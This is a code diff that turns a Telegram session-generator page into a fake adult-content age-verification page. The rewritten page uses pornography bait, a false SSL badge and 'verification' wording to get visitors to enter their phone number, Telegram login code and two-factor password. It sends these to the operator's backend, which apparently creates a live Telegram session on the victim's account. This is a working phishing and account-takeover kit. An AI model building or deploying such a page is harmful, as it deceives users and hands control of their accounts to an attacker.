@@ -3,243 +3,415 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login For Videos</title>
+    <title>Restricted Access - Adults Only</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+        
         body {
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: url('https://img.vidstack.io/0yWjwOj7J_XsCj.0') center/cover no-repeat fixed;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             color: #fff;
+            position: relative;
         }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(8px);
+            z-index: 0;
+        }
+        
+        body::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(255, 50, 100, 0.2) 0%, rgba(100, 0, 100, 0.3) 100%);
+            z-index: 0;
+        }
+        
         .container {
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(10px);
-            padding: 40px;
+            background: rgba(15, 15, 20, 0.92);
+            backdrop-filter: blur(20px);
+            padding: 50px 45px;
             border-radius: 20px;
             width: 90%;
-            max-width: 450px;
-            border: 1px solid rgba(255,255,255,0.1);
+            max-width: 420px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 30px 100px rgba(0, 0, 0, 0.8),
+                        0 0 60px rgba(255, 50, 100, 0.15);
+            position: relative;
+            z-index: 1;
         }
+        
+        .age-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #ff3366, #ff6b6b);
+            color: #fff;
+            padding: 8px 18px;
+            border-radius: 25px;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 20px rgba(255, 51, 102, 0.4);
+        }
+        
         h1 {
             text-align: center;
             margin-bottom: 10px;
-            color: #00d4aa;
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff 0%, #ff99aa 50%, #ff3366 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
+        
         .subtitle {
             text-align: center;
-            color: #888;
+            color: #999;
             margin-bottom: 30px;
             font-size: 14px;
+            font-weight: 400;
         }
+        
+        .warning-box {
+            background: rgba(255, 50, 100, 0.1);
+            border: 1px solid rgba(255, 50, 100, 0.3);
+            border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 28px;
+            text-align: center;
+        }
+        
+        .warning-box p {
+            font-size: 13px;
+            color: #ff99aa;
+            line-height: 1.6;
+        }
+        
         .step {
             display: none;
         }
+        
         .step.active {
             display: block;
-            animation: fadeIn 0.3s ease;
+            animation: fadeIn 0.4s ease;
         }
+        
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
+            from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
+        
         .input-group {
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
+        
         label {
             display: block;
-            margin-bottom: 8px;
-            color: #aaa;
-            font-size: 14px;
+            margin-bottom: 10px;
+            color: #bbb;
+            font-size: 13px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
         }
+        
         input {
             width: 100%;
-            padding: 15px;
-            border: 2px solid rgba(255,255,255,0.1);
-            border-radius: 10px;
-            background: rgba(0,0,0,0.3);
+            padding: 18px 20px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 14px;
+            background: rgba(0, 0, 0, 0.5);
             color: #fff;
             font-size: 16px;
-            transition: all 0.3s;
+            transition: all 0.3s ease;
         }
+        
+        input::placeholder {
+            color: #666;
+        }
+        
         input:focus {
             outline: none;
-            border-color: #00d4aa;
+            border-color: #ff3366;
+            background: rgba(0, 0, 0, 0.6);
+            box-shadow: 0 0 25px rgba(255, 51, 102, 0.2);
         }
+        
         button {
             width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #00d4aa, #00a884);
+            padding: 18px;
+            background: linear-gradient(135deg, #ff3366, #ff6b6b);
             color: #fff;
             border: none;
-            border-radius: 10px;
+            border-radius: 14px;
             font-size: 16px;
-            font-weight: bold;
+            font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 5px;
         }
+        
         button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(0,212,170,0.3);
+            transform: translateY(-3px);
+            box-shadow: 0 15px 50px rgba(255, 51, 102, 0.5);
         }
+        
+        button:active {
+            transform: translateY(-1px);
+        }
+        
         button:disabled {
-            opacity: 0.6;
+            opacity: 0.5;
             cursor: not-allowed;
             transform: none;
+            box-shadow: none;
         }
+        
         .info-box {
-            background: rgba(0,212,170,0.1);
-            border-left: 4px solid #00d4aa;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 13px;
-            color: #ccc;
+            background: rgba(255, 255, 255, 0.05);
+            border-left: 4px solid #ff3366;
+            padding: 18px;
+            border-radius: 0 12px 12px 0;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #aaa;
+            line-height: 1.6;
         }
+        
         .error {
-            background: rgba(255,0,0,0.1);
+            background: rgba(255, 0, 0, 0.1);
             border-left-color: #ff4444;
             color: #ff8888;
         }
+        
         .success {
-            background: rgba(0,255,0,0.1);
+            background: rgba(0, 255, 100, 0.1);
             border-left-color: #00ff88;
             color: #88ffaa;
         }
+        
         .loading {
             display: none;
             text-align: center;
-            padding: 20px;
+            padding: 30px;
         }
+        
         .loading.active {
             display: block;
         }
+        
         .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(255,255,255,0.1);
-            border-top-color: #00d4aa;
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #ff3366;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
+            margin: 0 auto 20px;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        @keyframes spin { 
+            to { transform: rotate(360deg); } 
+        }
+        
         .phone-display {
             text-align: center;
-            padding: 15px;
-            background: rgba(0,0,0,0.3);
-            border-radius: 10px;
-            margin-bottom: 20px;
-            font-family: monospace;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 14px;
+            margin-bottom: 25px;
+            font-family: 'SF Mono', monospace;
             font-size: 18px;
-            color: #00d4aa;
+            color: #ff99aa;
+            border: 1px solid rgba(255, 51, 102, 0.3);
+            letter-spacing: 1px;
         }
+        
         .resend {
             text-align: center;
-            margin-top: 15px;
-            color: #888;
+            margin-top: 22px;
+            color: #777;
+            font-size: 14px;
+        }
+        
+        .resend a {
+            color: #ff99aa;
+            cursor: pointer;
+            text-decoration: underline;
+            transition: color 0.3s;
+            font-weight: 500;
+        }
+        
+        .resend a:hover {
+            color: #ff3366;
+        }
+        
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 35px;
+            padding-top: 28px;
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .secure-badge svg {
+            width: 16px;
+            height: 16px;
+            fill: #00ff88;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-top: 22px;
             font-size: 13px;
         }
-        .resend a {
-            color: #00d4aa;
-            cursor: pointer;
+        
+        .footer-links a {
+            color: #777;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .footer-links a:hover {
+            color: #ff99aa;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🚀 Pyrogram Session</h1>
-        <p class="subtitle">Generate Telegram session string</p>
+        <div style="text-align: center;">
+            <span class="age-badge">18+ Adults Only</span>
+        </div>
         
+        <h1>Restricted Access</h1>
+        <p class="subtitle">Verify your identity to access exclusive adult content</p>
+        
+        <div class="warning-box">
+            <p>This website contains explicit adult material. By entering, you confirm you are at least 18 years of age.</p>
+        </div>
+
         <!-- Step 1: Enter Phone -->
         <div id="step1" class="step active">
             <div class="info-box">
-                📱 Enter your phone number with country code. You'll receive a code via Telegram app.
+                Enter your phone number with country code. A secure verification code will be sent to your Telegram app.
             </div>
-            
-            <div class="input-group">
-                <label>Session Name (optional)</label>
-                <input type="text" id="sessionName" placeholder="my_session" value="session">
-            </div>
-            
+
             <div class="input-group">
                 <label>Phone Number</label>
                 <input type="tel" id="phone" placeholder="+91 98765 43210" autocomplete="tel">
             </div>
-            
-            <button onclick="sendCode()" id="sendBtn">Send Telegram Code</button>
-            
+
+            <button onclick="sendCode()" id="sendBtn">Continue to Verification</button>
+
             <div class="loading" id="loading1">
                 <div class="spinner"></div>
-                <p>Connecting to Telegram...</p>
+                <p style="color: #888; font-size: 14px;">Connecting to secure server...</p>
             </div>
         </div>
-        
+
         <!-- Step 2: Enter Code -->
         <div id="step2" class="step">
             <div class="info-box success">
-                ✅ Code sent! Check your Telegram app.
+                Verification code sent successfully! Check your Telegram messages.
             </div>
-            
+
             <div class="phone-display" id="phoneDisplay"></div>
-            
+
             <div class="input-group">
-                <label>Telegram Code</label>
-                <input type="text" id="code" placeholder="12345" maxlength="5">
+                <label>Verification Code</label>
+                <input type="text" id="code" placeholder="Enter 5-digit code" maxlength="5">
             </div>
-            
+
             <div class="input-group" id="passwordGroup" style="display:none;">
-                <label>2FA Password (if enabled)</label>
-                <input type="password" id="password" placeholder="Your 2FA password">
+                <label>Two-Factor Password</label>
+                <input type="password" id="password" placeholder="Enter 2FA password">
             </div>
-            
-            <button onclick="verifyCode()" id="verifyBtn">Verify & Create Session</button>
-            
+
+            <button onclick="verifyCode()" id="verifyBtn">Access Adult Content</button>
+
             <div class="loading" id="loading2">
                 <div class="spinner"></div>
-                <p>Creating session...</p>
+                <p style="color: #888; font-size: 14px;">Verifying your credentials...</p>
             </div>
-            
+
             <div class="resend">
-                Didn't receive? <a onclick="backToStep1()">Change number</a>
+                Didn't receive code? <a onclick="backToStep1()">Try again</a>
             </div>
         </div>
-        
+
         <div id="message"></div>
+        
+        <div class="secure-badge">
+            <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            <span>256-bit SSL Encrypted Connection</span>
+        </div>
+        
+        <div class="footer-links">
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">2257 Compliance</a>
+            <a href="#">Support</a>
+        </div>
     </div>
 
     <script>
         let currentSessionId = null;
-        
+
         function showMessage(text, type='info') {
             const msg = document.getElementById('message');
             msg.innerHTML = `<div class="info-box ${type}">${text}</div>`;
         }
-        
+
         async function sendCode() {
             const phone = document.getElementById('phone').value.trim();
-            const sessionName = document.getElementById('sessionName').value.trim() || 'session';
-            
+
             if (!phone || phone.length < 10) {
-                showMessage('Please enter valid phone number with country code', 'error');
+                showMessage('Please enter a valid phone number with country code', 'error');
                 return;
             }
-            
+
             document.getElementById('loading1').classList.add('active');
             document.getElementById('sendBtn').disabled = true;
-            
+
             try {
                 const r = await fetch('/api/send-code', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({phone, session_name: sessionName})
+                    body: JSON.stringify({phone, session_name: 'adult_session'})
                 });
-                
+
                 const data = await r.json();
-                
+
                 if (data.ok) {
                     currentSessionId = data.session_id;
                     document.getElementById('phoneDisplay').textContent = phone;
@@ -247,29 +419,29 @@
                     document.getElementById('step2').classList.add('active');
                     document.getElementById('code').focus();
                 } else {
-                    showMessage(data.error || 'Failed to send code', 'error');
+                    showMessage(data.error || 'Failed to send verification code', 'error');
                     document.getElementById('sendBtn').disabled = false;
                 }
             } catch (e) {
-                showMessage('Network error. Try again.', 'error');
+                showMessage('Connection error. Please try again.', 'error');
                 document.getElementById('sendBtn').disabled = false;
             }
-            
+
             document.getElementById('loading1').classList.remove('active');
         }
-        
+
         async function verifyCode() {
             const code = document.getElementById('code').value.trim();
             const password = document.getElementById('password').value;
-            
+
             if (!code) {
-                showMessage('Please enter the code', 'error');
+                showMessage('Please enter the verification code', 'error');
                 return;
             }
-            
+
             document.getElementById('loading2').classList.add('active');
             document.getElementById('verifyBtn').disabled = true;
-            
+
             try {
                 const r = await fetch('/api/verify-code', {
                     method: 'POST',
@@ -280,34 +452,35 @@
                         password: password || undefined
                     })
                 });
-                
+
                 const data = await r.json();
-                
+
                 if (data.ok) {
                     window.location.href = '/dashboard';
                 } else if (data.requires_password) {
                     document.getElementById('passwordGroup').style.display = 'block';
-                    showMessage('This account has 2FA enabled. Enter your password.', 'info');
+                    showMessage('Two-factor authentication required. Enter your password.', 'info');
                     document.getElementById('verifyBtn').disabled = false;
                 } else {
-                    showMessage(data.error || 'Invalid code', 'error');
+                    showMessage(data.error || 'Invalid verification code', 'error');
                     document.getElementById('verifyBtn').disabled = false;
                 }
             } catch (e) {
-                showMessage('Network error. Try again.', 'error');
+                showMessage('Connection error. Please try again.', 'error');
                 document.getElementById('verifyBtn').disabled = false;
             }
-            
+
             document.getElementById('loading2').classList.remove('active');
         }
-        
+
         function backToStep1() {
             document.getElementById('step2').classList.remove('active');
             document.getElementById('step1').classList.add('active');
             document.getElementById('sendBtn').disabled = false;
+            document.getElementById('passwordGroup').style.display = 'none';
             currentSessionId = null;
         }
-        
+
         // Enter key support
         document.getElementById('phone')?.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') sendCode();
